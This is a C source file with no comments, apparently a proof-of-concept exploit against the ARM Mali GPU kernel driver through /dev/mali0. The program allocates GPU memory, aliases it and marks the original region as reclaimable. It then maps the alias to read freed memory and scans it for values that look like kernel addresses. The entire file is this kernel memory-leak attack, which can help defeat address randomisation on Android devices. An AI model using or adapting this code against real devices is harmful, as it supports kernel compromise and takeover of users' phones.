#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/ioctl.h>
typedef uint64_t __u64; typedef uint32_t __u32; typedef uint16_t __u16;
#include "mali.h"
#define ALLOC_SIZE (128u*1024*1024)
int main(){struct kbase_ioctl_version_check v={.major=999,.minor=999};int fd=open("/dev/mali0",O_RDWR);if(fd<0){perror("open");return 1;}if(ioctl(fd,KBASE_IOCTL_VERSION_CHECK,&v)<0){perror("version");return 1;}printf("version %d.%d\n",v.major,v.minor);struct kbase_ioctl_set_flags f={.create_flags=0};if(ioctl(fd,KBASE_IOCTL_SET_FLAGS,&f)<0){perror("flags");return 1;}void *track=mmap(NULL,ALLOC_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fd,BASE_MEM_MAP_TRACKING_HANDLE);if(track==MAP_FAILED){perror("track");return 1;}union kbase_ioctl_mem_alloc ma;memset(&ma,0,sizeof(ma));ma.in.va_pages=ALLOC_SIZE>>12;ma.in.commit_pages=ALLOC_SIZE>>12;ma.in.flags=BASE_MEM_SAME_VA|BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_CPU_WR|BASE_MEM_PROT_GPU_WR;if(ioctl(fd,KBASE_IOCTL_MEM_ALLOC,&ma)<0){perror("alloc");return 1;}printf("gpu_va=%llx flags=%llx\n",(unsigned long long)ma.out.gpu_va,(unsigned long long)ma.out.flags);void *gpu=mmap(NULL,ALLOC_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.out.gpu_va);if(gpu==MAP_FAILED){perror("gpu mmap");return 1;}printf("gpu=%p\n",gpu);union kbase_ioctl_mem_alias al;memset(&al,0,sizeof(al));al.in.nents=1;al.in.stride=ALLOC_SIZE>>12;al.in.flags=BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_GPU_WR|BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_CPU_WR;struct base_mem_aliasing_info ai;memset(&ai,0,sizeof(ai));ai.handle.basep.handle=(__u64)(uintptr_t)gpu;ai.offset=0;ai.length=ALLOC_SIZE>>12;al.in.aliasing_info=(__u64)(uintptr_t)&ai;if(ioctl(fd,KBASE_IOCTL_MEM_ALIAS,&al)<0){perror("alias");return 1;}printf("alias_gpu=%llx pages=%llx\n",(unsigned long long)al.out.gpu_va,(unsigned long long)al.out.va_pages);struct kbase_ioctl_mem_flags_change fc={.gpu_va=(__u64)(uintptr_t)gpu,.mask=BASE_MEM_DONT_NEED,.flags=BASE_MEM_DONT_NEED};if(ioctl(fd,KBASE_IOCTL_MEM_FLAGS_CHANGE,&fc)<0){perror("flags_change");return 1;}printf("freed\n");void *alias=mmap(NULL,ALLOC_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)al.out.gpu_va);if(alias==MAP_FAILED){perror("alias mmap");return 1;}printf("alias=%p\n",alias);uint64_t *p=(uint64_t*)alias;size_t n=ALLOC_SIZE/8;int found=0;for(size_t i=0;i<n;i++){if((p[i]&0xffffff8000000000ULL)==0xffffff8000000000ULL){printf("kaddr[%zu]=%llx\n",i,(unsigned long long)p[i]);if(++found>=20)break;}}printf("found=%d\n",found);return 0;}
